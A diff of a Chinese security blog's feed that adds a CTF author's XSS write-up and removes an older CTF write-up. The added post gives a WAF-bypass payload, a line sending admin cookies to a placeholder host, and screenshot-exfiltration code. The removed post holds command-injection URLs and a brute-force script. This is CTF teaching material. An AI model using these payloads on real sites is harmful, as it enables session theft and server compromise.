@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://www.codemonster.cn/"/>
-  <updated>2020-03-09T13:41:47.681Z</updated>
+  <updated>2020-05-06T05:35:34.542Z</updated>
   <id>https://www.codemonster.cn/</id>
   
   <author>
@@ -14,6 +14,63 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>2020 De1CTF Animal Crossing WriteUp</title>
+    <link href="https://www.codemonster.cn/2020/05/06/2020-de1ctf-animal-crossing-writeup/"/>
+    <id>https://www.codemonster.cn/2020/05/06/2020-de1ctf-animal-crossing-writeup/</id>
+    <published>2020-05-06T05:32:59.000Z</published>
+    <updated>2020-05-06T05:35:34.542Z</updated>
+    
+    <content type="html"><![CDATA[<p>一年一度的De1CTF又来了，这次出了道简单XSS题，下面是具体WriteUp。<br><a id="more"></a></p>
+<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>免费创建护照来展示你的岛屿！</p>
+<h2 id="第一关：绕过云WAF"><a href="#第一关：绕过云WAF" class="headerlink" title="第一关：绕过云WAF"></a>第一关：绕过云WAF</h2><p>云WAF通常有好几层好几种过滤手段，这里我也是设计了了两层防护</p>
+<h3 id="第一层：黑名单检测"><a href="#第一层：黑名单检测" class="headerlink" title="第一层：黑名单检测"></a>第一层：黑名单检测</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> blackList = []<span class="keyword">string</span>&#123;</div><div class="line">	<span class="comment">//global</span></div><div class="line">	<span class="string">"document"</span>, <span class="string">"window"</span>, <span class="string">"top"</span>, <span class="string">"parent"</span>, <span class="string">"global"</span>, <span class="string">"this"</span>,</div><div class="line">	<span class="comment">//func</span></div><div class="line">	<span class="string">"console"</span>, <span class="string">"alert"</span>, <span class="string">"log"</span>, <span class="string">"promise"</span>, <span class="string">"fetch"</span>, <span class="string">"eval"</span>, <span class="string">"import"</span>,</div><div class="line">	<span class="comment">//char</span></div><div class="line">	<span class="string">"&lt;"</span>, <span class="string">"&gt;"</span>, <span class="string">"`"</span>, <span class="string">"\\*"</span>, <span class="string">"&amp;"</span>, <span class="string">"#"</span>, <span class="string">"%"</span>, <span class="string">"\\\\"</span>,</div><div class="line">	<span class="comment">//key</span></div><div class="line">	<span class="string">"if"</span>, <span class="string">"set"</span>, <span class="string">"get"</span>, <span class="string">"with"</span>, <span class="string">"yield"</span>, <span class="string">"async"</span>, <span class="string">"wait"</span>, <span class="string">"func"</span>, <span class="string">"for"</span>, <span class="string">"error"</span>, <span class="string">"string"</span>,</div><div class="line">	<span class="comment">//string</span></div><div class="line">	<span class="string">"href"</span>, <span class="string">"location"</span>, <span class="string">"url"</span>, <span class="string">"cookie"</span>, <span class="string">"src"</span>,</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>黑名单的绕过思路无非避开被ban的字符串和字符，这里因为go的iris框架问题（看不出来是golang吧），导致<code>;</code>后的东西会被删掉，可以用%0a绕过</p>
+<h3 id="第二层：静态语法分析"><a href="#第二层：静态语法分析" class="headerlink" title="第二层：静态语法分析"></a>第二层：静态语法分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">1. 将data传入`fmt.Sprintf(&quot;&apos;%s&apos;;&quot;, data)`，然后进行语法解析，这里parse失败直接ban</div><div class="line">2. 接着遍历AST进行分析：</div><div class="line">   1. VariableExpression/AssignExpression，所有声明语句/赋值语句直接ban</div><div class="line">   2. CallExpression，所有函数调用的，且callee不为Identifier的直接ban</div><div class="line">      1. ban：`test.test()`、`a[x]()`</div><div class="line">      2. pass：`test()`</div><div class="line">   3. BracketExpression，也就是成员引用，Member不为Identifier的直接ban，</div><div class="line">      1. ban：`a[1]`、`a[&apos;xx&apos;]`</div><div class="line">      2. pass：`a[x]`</div></pre></td></tr></table></figure>
+<p>这一层waf，其实只要摸清ban的套路，针对性找到没被处理的语法来绕过即可，这里我的预期解是用throw传递变量，但是还有很多其他能用的语法（事实证明确实有很多</p>
+<p>预期解payload：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">data=base64code<span class="string">'%0atry&#123;throw '</span>ev<span class="string">'%2b'</span>al<span class="string">'&#125;catch(e)&#123;try&#123;throw frames[e]&#125;catch(c)&#123;c(atob(data))&#125;&#125;%0a//</span></div></pre></td></tr></table></figure>
+<p>绕过WAF的两层防护之后本地能成功alert就可以用</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">location.href = <span class="string">"http://xxxx/?"</span> + btoa(ducument.cookie)</div></pre></td></tr></table></figure>
+<p>打到管理员cookie了，cookie中包含一半的flag：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG=De1CTF&#123;I_l1k4_</div></pre></td></tr></table></figure>
+<h2 id="第二关：读取400张图片"><a href="#第二关：读取400张图片" class="headerlink" title="第二关：读取400张图片"></a>第二关：读取400张图片</h2><p>另外一半flag，题目给了hint：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">管理员在做什么?</div></pre></td></tr></table></figure>
+<p>读取管理员的document，会发现有400多张png图片，flag就藏在这些图片当中，这里设计的时候预设了下面几种解法：</p>
+<ol>
+<li>绕过CSP引入截图库，截图后把图片传到/upload，获取图片地址回传，然后下载图片</li>
+<li>用for循环把400个图全部传到/upload，获取400个图片地址然后回传</li>
+<li>直接读取图片回传，可以是写脚本一张一张传，也可以是用for循环批量传，但是回传过程需要编码转换，传回去后也需要再转成图片进行拼接</li>
+</ol>
+<p>三种方法有简单的也有复杂的，国外三支队伍用的都是第三种，把所有图片dump出去（我猜大佬们没发现/upload接口 23333），而国内的选手用的是解法2，下面我详细介绍下绕过CSP引入截图库的解法，其他的方法也是类似，就不全写出来了（感兴趣的可以去看解出来的大佬们的wp）。</p>
+<h3 id="绕过CSP引入截图库"><a href="#绕过CSP引入截图库" class="headerlink" title="绕过CSP引入截图库"></a>绕过CSP引入截图库</h3><p>本题的主要功能是制造动森护照，主页是有一个上传文件接口的，利用/upload接口，可以上传任意png后缀的文件，然后用fetch读这个png文件，再eval一下，就可以绕过CSP引入html2canvas库并且执行了，上传的png文件如下</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">	...</div><div class="line">  ...</div><div class="line">html2canvas.js代码</div><div class="line">	...</div><div class="line">  ...</div><div class="line"></div><div class="line"><span class="comment">// 截图-&gt;上传到upload-&gt;外传图片地址</span></div><div class="line">html2canvas(<span class="built_in">document</span>.body).then(<span class="function"><span class="keyword">function</span>(<span class="params">canvas</span>) </span>&#123;</div><div class="line">        <span class="keyword">const</span> form = <span class="keyword">new</span> FormData(),</div><div class="line">        url = <span class="string">"/upload"</span>,</div><div class="line">        blob = <span class="keyword">new</span> Blob([canvas.toDataURL().toString()], &#123;<span class="attr">type</span> : <span class="string">"image/png"</span>&#125;)</div><div class="line">        file = <span class="keyword">new</span> File([blob], <span class="string">"a.png"</span>)</div><div class="line">        form.append(<span class="string">"file"</span>, file)</div><div class="line">        fetch(url, &#123;</div><div class="line">            method: <span class="string">"POST"</span>,</div><div class="line">            body: form</div><div class="line">        &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;</div><div class="line">            <span class="keyword">return</span> response.json()</div><div class="line">        &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</div><div class="line">            location.href=<span class="string">"//xxxxxxxxx:8099/?"</span>+data.data.toString()</div><div class="line">        &#125;)</div><div class="line">  &#125;)</div></pre></td></tr></table></figure>
+<p>这里我把截图操作的js也写到png里了，主要思路就是截图完用/upload传到服务器，获取返回的图片地址回传给攻击者</p>
+<h3 id="读取图片并执行"><a href="#读取图片并执行" class="headerlink" title="读取图片并执行"></a>读取图片并执行</h3><p>把图片用/upload接口上传后，获取png地址，再用可控的js部分去读取这个图片再执行即可</p>
+<p>读取并执行的代码如下：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">fetch(<span class="string">`/static/images/xxxxxxxxx.png`</span>).then(<span class="function"><span class="params">res</span>=&gt;</span>res.text()).then(<span class="function"><span class="params">txt</span>=&gt;</span><span class="built_in">eval</span>(txt))</div></pre></td></tr></table></figure>
+<p>用绕过第一关的办法包装一下就可以了</p>
+<p>最后提交到bot就能接收到管理员界面截图的地址了，直接下载就能看到另一半flag了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cool_GamE&#125;</div></pre></td></tr></table></figure>
+<p>最后flag：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">De1CTF&#123;I_l1k4_cool_GamE&#125;</div></pre></td></tr></table></figure>
+<h2 id="出题感想"><a href="#出题感想" class="headerlink" title="出题感想"></a>出题感想</h2><p>出这道题的原因是因为最近一段时间工作上接触云WAF比较多，而印象中的xss题还没有静态语法分析相关的，本着realworld的想法就套进来了，而第二关一开始是看到了PNG绕过CSP那篇文章，但是出题到后面发现没加图片校验，算了还是简单点吧23333。  </p>
+<p>这次比赛一共4支队伍解出这道题，其中3支国外队伍（老外还是🐂），一支国内队伍，总而言之，个人对这次出的这道题还是比较满意的，真的沉下心去研究绕WAF、外传图片的人也是能学到东西的，这就够啦！</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;一年一度的De1CTF又来了，这次出了道简单XSS题，下面是具体WriteUp。&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
+    
+      <category term="XSS" scheme="https://www.codemonster.cn/tags/XSS/"/>
+    
+  </entry>
   
   <entry>
     <title>2020 高校战“疫”网络安全分享赛部分WEB WriteUp</title>
@@ -1045,53 +1102,6 @@
       <category term="EXP" scheme="https://www.codemonster.cn/tags/EXP/"/>
     
       <category term="getshell" scheme="https://www.codemonster.cn/tags/getshell/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>2017 hackburger.ee 部分题 WriteUp</title>
-    <link href="https://www.codemonster.cn/2017/07/28/2017-hackburger-some-writeup/"/>
-    <id>https://www.codemonster.cn/2017/07/28/2017-hackburger-some-writeup/</id>
-    <published>2017-07-28T08:13:54.000Z</published>
-    <updated>2018-05-04T07:47:50.011Z</updated>
-    
-    <content type="html"><![CDATA[<p>hackburger.ee一共只有10道题，但是都非常有意思，花了些时间做出了5道，这里记录一下，后续做出来的也会更新上来<br><a id="more"></a></p>
-<h2 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h2><p>A ping utility, to ping stuff, you know<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://burger.laboratorium.ee:8000/</div></pre></td></tr></table></figure></p>
-<p>命令执行漏洞，%0a换行后就可以执行任意命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://burger.laboratorium.ee:8000/?host=127.0.0.1%0als</div></pre></td></tr></table></figure></p>
-<p>然后cat flag.php即可拿到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">The flag is f1b35744925a3f5946c542a1ee64267af8b93b06</div></pre></td></tr></table></figure></p>
-<h2 id="File-search"><a href="#File-search" class="headerlink" title="File search"></a>File search</h2><p>Here you can search files<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://burger.laboratorium.ee:8004/</div></pre></td></tr></table></figure></p>
-<p>fuzz中发现这题的搜索框会搜索到文件名或内容包含该字符串的文件，很多人用burp手动跑，我就用py写了个小脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="comment">#-*- coding: utf-8 -*-</span></div><div class="line"><span class="comment">#by:CodeMonster</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line">r=requests.session()</div><div class="line">str=<span class="string">"abcdefhijklmnopqrstuvwxyz1234567890_g"</span></div><div class="line">ls=len(str)</div><div class="line">url=<span class="string">"http://burger.laboratorium.ee:8004/"</span></div><div class="line">flag=<span class="string">""</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">postq</span><span class="params">(s1)</span>:</span></div><div class="line">    data=&#123;<span class="string">"query"</span>:s1&#125;</div><div class="line">    r1=r.post(url=url,data=data)</div><div class="line">    <span class="keyword">return</span> len(re.findall( <span class="string">r'flag.txt'</span>, r1.text))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun1</span><span class="params">(s)</span>:</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str:</div><div class="line">        flag=s+i</div><div class="line">        <span class="keyword">print</span> flag</div><div class="line">        <span class="keyword">if</span> postq(flag)==<span class="number">1</span>:</div><div class="line">            <span class="keyword">print</span> flag</div><div class="line">            flag=fun1(flag)</div><div class="line">            <span class="keyword">break</span></div><div class="line">    <span class="keyword">return</span> flag</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun2</span><span class="params">(s)</span>:</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str:</div><div class="line">        flag=i+s</div><div class="line">        <span class="keyword">print</span> flag</div><div class="line">        <span class="keyword">if</span> postq(flag)==<span class="number">1</span>:</div><div class="line">            <span class="keyword">print</span> flag</div><div class="line">            flag=fun2(flag)</div><div class="line">            <span class="keyword">break</span></div><div class="line">    <span class="keyword">return</span> flag</div><div class="line"></div><div class="line"><span class="keyword">print</span> fun2(fun1(flag)[<span class="number">0</span>:<span class="number">-1</span>])[<span class="number">1</span>:]</div></pre></td></tr></table></figure></p>
-<p>这里把g字符放到了后面，因为怕匹配出flag字符串，最后flag为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">t_h_e__f_l_a_g__i_s__c82584c307421228a3c5c5e4dc6a3ea31859975e</div></pre></td></tr></table></figure></p>
-<h2 id="Number-to-ASCII-converter"><a href="#Number-to-ASCII-converter" class="headerlink" title="Number to ASCII converter"></a>Number to ASCII converter</h2><p>A tool to convert numbers to ASCII characters<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://burger.laboratorium.ee:8001/</div></pre></td></tr></table></figure></p>
-<p>题目给了源代码，很容易看出<code>assert($_GET[&#39;number&#39;], &quot;Number is zero&quot;);</code>这里存在<code>命令执行漏洞</code><br>构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://burger.laboratorium.ee:8001/?number=eval(system(&quot;cat where/is/the/flag/i/am/looking/for/flag.php&quot;))</div></pre></td></tr></table></figure></p>
-<p>读取flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">The flag is adb92727cb7edc1802eb4616d23aef3ffaa928a4</div></pre></td></tr></table></figure></p>
-<h2 id="That’s-not-how-you-write-signup"><a href="#That’s-not-how-you-write-signup" class="headerlink" title="That’s not how you write signup"></a>That’s not how you write signup</h2><p>A login form and a registration form. With some problems (but not SQL injection, SQLi is boring).<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://burger.laboratorium.ee:8002/</div></pre></td></tr></table></figure></p>
-<p>题目给了登录和注册功能，源代码也给了，提示不是注入，又需要admin登录，就想到一个姿势，mysql字符截断漏洞,因为没有限制用户名长度，就可以注册一个用户名为<code>admin                         (...很多空格...)111</code>的用户，然后就可以登录admin账号</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Flag is ad0f46b77ae29d84a5f2b3a9b0784853d2aee093</div></pre></td></tr></table></figure>
-<h2 id="Magic"><a href="#Magic" class="headerlink" title="Magic"></a>Magic</h2><p>The description left out intentionally. Flag3 is currently unavailable, enter 0 instead.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://burger.laboratorium.ee:8006/</div></pre></td></tr></table></figure></p>
-<p>考察的是扫描器？？robots.txt有个flag，index.php~有个flag，.git泄露，用githack爬下来index.php里面有个flag，拼接起来就是最后的flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">47b9664515420d44d2c77dc593f7514ccbd17be8_392d28473a135c2491c227f373d0eed0310e13e3_0_ebb696a5abb04c8875a0afa29f6dc8d167db67e8</div></pre></td></tr></table></figure></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;hackburger.ee一共只有10道题，但是都非常有意思，花了些时间做出了5道，这里记录一下，后续做出来的也会更新上来&lt;br&gt;
-    
-    </summary>
-    
-    
-      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
-    
-      <category term="mysql字符截断" scheme="https://www.codemonster.cn/tags/mysql%E5%AD%97%E7%AC%A6%E6%88%AA%E6%96%AD/"/>
-    
-      <category term="php" scheme="https://www.codemonster.cn/tags/php/"/>
-    
-      <category term="python" scheme="https://www.codemonster.cn/tags/python/"/>
-    
-      <category term="RCE" scheme="https://www.codemonster.cn/tags/RCE/"/>
-    
-      <category term="命令执行" scheme="https://www.codemonster.cn/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-      <category term="源码泄露" scheme="https://www.codemonster.cn/tags/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
     
   </entry>
   
